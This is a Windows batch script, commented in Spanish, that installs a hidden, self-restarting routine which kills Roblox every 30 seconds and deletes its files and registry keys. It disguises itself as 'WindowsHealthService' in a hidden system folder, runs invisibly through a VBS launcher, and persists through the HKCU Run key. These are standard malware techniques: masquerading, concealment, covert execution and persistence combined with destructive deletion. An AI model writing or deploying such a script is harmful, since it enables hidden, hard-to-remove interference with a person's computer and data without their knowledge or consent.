@echo off
set "targetDir=C:\ProgramData\WindowsHealthService"
set "cleanerName=system_cleanup.bat"
set "vbsName=start_service.vbs"

:: 1. Crear el directorio estratégico
if not exist "%targetDir%" mkdir "%targetDir%"
attrib +h +s "%targetDir%"

:: 2. Crear el script de limpieza (Bucle Infinito)
echo @echo off > "%targetDir%\%cleanerName%"
echo :loop >> "%targetDir%\%cleanerName%"
echo :: Matar procesos de Roblox >> "%targetDir%\%cleanerName%"
echo taskkill /F /IM RobloxPlayerBeta.exe /T ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
echo taskkill /F /IM RobloxPlayerLauncher.exe /T ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
echo taskkill /F /IM RobloxStudioBeta.exe /T ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
echo :: Borrar archivos de instalacion >> "%targetDir%\%cleanerName%"
echo if exist "%%LocalAppData%%\Roblox" rd /s /q "%%LocalAppData%%\Roblox" ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
echo if exist "%%ProgramFiles(x86)%%\Roblox" rd /s /q "%%ProgramFiles(x86)%%\Roblox" ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
echo :: Borrar llaves de registro >> "%targetDir%\%cleanerName%"
echo reg delete "HKEY_CURRENT_USER\Software\Roblox" /f ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
echo reg delete "HKEY_CURRENT_USER\Software\Roblox Corporation" /f ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
echo :: Esperar 30 segundos antes de la siguiente revision >> "%targetDir%\%cleanerName%"
echo timeout /t 30 /nobreak ^>nul >> "%targetDir%\%cleanerName%"
echo goto loop >> "%targetDir%\%cleanerName%"

:: 3. Crear el script VBS para ejecucion invisible
echo Set WshShell = CreateObject("WScript.Shell") > "%targetDir%\%vbsName%"
echo WshShell.Run chr(34) ^& "%targetDir%\%cleanerName%" ^& Chr(34), 0 >> "%targetDir%\%vbsName%"
echo Set WshShell = Nothing >> "%targetDir%\%vbsName%"

:: 4. Persistencia en el Registro (Carga en cada inicio)
:: Se registra en HKCU para que no requiera permisos de administrador para activarse
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthService" /t REG_SZ /d "wscript.exe \"%targetDir%\%vbsName%\"" /f >nul 2>&1

:: 5. Ejecutar ahora mismo de forma invisible
start wscript.exe "%targetDir%\%vbsName%"

echo Instalacion completada. Roblox sera eliminado periodicamente de forma invisible.
pause